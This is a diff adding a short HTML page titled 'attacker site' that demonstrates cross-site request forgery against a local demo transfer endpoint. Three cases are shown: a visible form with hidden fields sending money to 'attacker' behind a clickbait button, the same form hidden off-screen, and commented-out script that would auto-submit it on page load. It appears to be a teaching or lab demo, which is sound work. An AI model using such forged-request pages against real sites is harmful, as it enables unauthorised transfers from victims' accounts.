@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>attacker site</title>
+
+  <style>
+    .eval-form{
+      display: none;
+      position: absolute;
+      left: -9999px;
+      opacity: 0;
+    }
+  </style>
+</head>
+
+<body>
+  <h2>case 1:</h2>
+  <form action="http://localhost:4000/transfer" method="POST">
+    <input type="hidden" name="fromAccount" value="google" />
+    <input type="hidden" name='toAccount' value="attacker">
+    <input type="hidden" name='amount' value="100">
+    <input type="submit" value="View Sexy Girls' Pictures!" />
+  </form>
+
+  <hr>
+
+  <h2>case 2: the form hide deeply</h2>
+  <div>
+    <div>
+      <div>
+        <div>
+          <form id='eval-form' class="eval-form" action="http://localhost:4000/transfer" method="POST">
+            <input type="hidden" name="fromAccount" value="google" />
+            <input type="hidden" name='toAccount' value="attacker">
+            <input type="hidden" name='amount' value="100">
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+  <input type="submit" form="eval-form" value="View Sexy Girls' Pictures!" />
+
+  <h2>case 3: executed automatically using JavaScript</h2>
+
+  <script>
+    // (function () {
+    //   window.onload = function () {
+    //     const $evalForm = document.getElementById('eval-form');
+    //     $evalForm.submit();
+    //   }
+    // })();
+  </script>
+</body>
+
+</html>
